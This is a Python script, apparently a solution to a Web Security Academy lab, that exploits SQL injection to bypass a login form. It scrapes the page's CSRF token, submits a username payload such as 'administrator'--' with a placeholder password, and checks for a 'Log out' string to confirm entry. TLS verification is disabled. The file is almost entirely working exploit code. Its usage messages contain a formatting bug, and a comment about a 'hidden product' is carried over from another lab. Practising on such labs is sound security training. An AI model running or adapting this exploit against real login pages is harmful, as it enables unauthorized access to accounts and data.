# Example usage 
# python3 2_SQLi_login_bypass/code.py https://0aff005303a8cb04a3e759a4008200ee.web-security-academy.net/login "administrator'--"

import requests
import sys
import urllib3
from bs4 import BeautifulSoup


# Add proxies for debugging
# proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}

def get_csrf_token(s,url):
    r = s.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_token = soup.find('input', {'name':'csrf'})['value']
    return csrf_token

def exploit_sqli(session, url,payload):
    # Disable SSL warnings
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    csrf=get_csrf_token(session,url)
    print(f"CSRF Token: {csrf}")
    
    data={
        'csrf':csrf,
        'username': payload,
        'password': 'password',
    }

    r = session.post(url, data=data, verify=False)    
    # Check if the response has the hidden product
    if "Log out" in r.text:
        return True
    else:
        return False


if __name__ == '__main__':
    # Extract params 
    try:
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
        
    # Show how to use in command line of parameters are not provided 
    except IndexError: 
        print("👉 Usage: <url> <payload>" %sys.argv[0])
        print("👉 Example: https://example.com '1==1'" %sys.argv[0])
        sys.exit(1)
        
    s=requests.Session()
    
    if exploit_sqli(s,url,payload):
        print("✅ SQL Injection was successful!")
    else:
        print("❌ SQL Injection was not successful!")
    
    